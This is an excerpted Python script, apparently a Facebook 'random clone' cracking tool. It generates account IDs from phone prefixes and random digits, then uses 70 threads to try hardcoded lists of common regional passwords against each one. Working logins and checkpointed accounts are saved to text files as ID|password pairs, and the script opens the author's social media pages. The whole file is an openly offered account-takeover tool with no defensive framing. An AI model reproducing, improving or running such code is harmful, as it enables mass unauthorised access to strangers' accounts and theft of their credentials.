...
os.system('xdg-openhttps://www.facebook.com/profile.php?id=100090146081904')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://www.facebook.com/profile.php?id=100081150990540')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
BM = '\x1b[1;101m' # BELAMAHDIG MERAH
...
logo=("""
  ...
  ─────────────────────────────────────────────────    
\033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
 \033[1;34m┃ [✓] AUTHOR    \033[1;91m: \033[1;92mAli          
 \033[1;34m┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE                
 \033[1;34m┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                        
 \033[1;34m┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA              
 \033[1;34m┃ [✓] GITHUB    \033[1;91m: \033[1;92mpubg-king  
 \033[1;34m┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mAliaqa Rahimi
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open https://https://t.me/Aliahjar')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100090146081904');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def annu():
    os.system('clear')
    print(logo)
    print('[1] RANDOM METHOD 1  \x1b[1;92m')
    print('\x1b[1;97m[2] RANDOM METOHD 2 \x1b[1;92m')
    print('\x1b[1;97m[3] RANDOM METHOD 3 \x1b[1;92m ')
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 078,079,076,070,077،****Etc')
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,2000,3000,4000,5000,****Etc')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','afghan1234','kabul123','100200','ali12345','khan1234','ali12345','herat123','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000','herat123','herat1234','sexy1234','password','!!@@##$$','۱۲۳۴۵۶۷۸۹','۱۲۳۴۵۶۷','۱۲۳۴۵۶۷۸','ali1234','khan12345','mazar123','badakhsh123','king1234','king12345','ppppaaaa','qqqqwwww','eeeewwww','xxxxaaaa','abass1234','khan123456','kashif123','haji1234','aryan123','aryan1234','aryan12345','omid1234','omid12345']
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 078,079,077,070,074,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','afghanistan','Afghan12345','kabul123','۱۲۳۴۵۶','100200','ali12345','khan1234','ali12345','herat123','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000','herat123','herat1234','sexy1234','password','!!@@##$$','۱۲۳۴۵۶۷۸۹','۱۲۳۴۵۶۷','۱۲۳۴۵۶۷۸','ali1234','khan12345','mazar123','badakhsh123','king1234','king12345','ppppaaaa','qqqqwwww','eeeewwww','xxxxaaaa','abass1234','khan123456','kashif123','haji1234','aryan123','aryan1234','aryan12345','omid1234','omid12345']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 078,079,077,070,076,,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,2000,3000,4000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123','100200','ali12345','khan1234','ali12345','herat123','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000','herat123','herat1234','sexy1234','password','!!@@##$$','۱۲۳۴۵۶۷۸۹','۱۲۳۴۵۶۷','۱۲۳۴۵۶۷۸','ali1234','khan12345','mazar123','badakhsh123','king1234','king12345','ppppaaaa','qqqqwwww','eeeewwww','xxxxaaaa','abass1234','khan123456','kashif123','haji1234','aryan123','aryan1234','aryan12345','omid1234','omid12345']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'pakistan','MAHDIMAHDI','MAHDI123','malik123','Ahmad123','100200','ali12345','khan1234','ali12345','herat123','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000','herat123','herat1234','sexy1234','password','!!@@##$$','۱۲۳۴۵۶۷۸۹','۱۲۳۴۵۶۷','۱۲۳۴۵۶۷۸','ali1234','khan12345','mazar123','badakhsh123','king1234','king12345','ppppaaaa','qqqqwwww','eeeewwww','xxxxaaaa','abass1234','khan123456','kashif123','haji1234','aryan123','aryan1234','aryan12345','omid1234','omid12345']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'MALIK123','pakistan','MAHDIMAHDI','MAHDI123','MAHDI12345','123456','Ahmad123','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000','herat123','herat1234','sexy1234','password','!!@@##$$','۱۲۳۴۵۶۷۸۹','۱۲۳۴۵۶۷','۱۲۳۴۵۶۷۸','ali1234','khan12345','mazar123','badakhsh123','king1234','king12345','ppppaaaa','qqqqwwww','eeeewwww','xxxxaaaa','abass1234','khan123456','kashif123','haji1234','aryan123','aryan1234','aryan12345','omid1234','omid12345']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Aliaqa-OK] '+cid+'|'+ps+'\033[0;97m')
                open('Aliaqa-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[Aliaqa-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Aliaqa-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mAliaqa-Rahimi\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
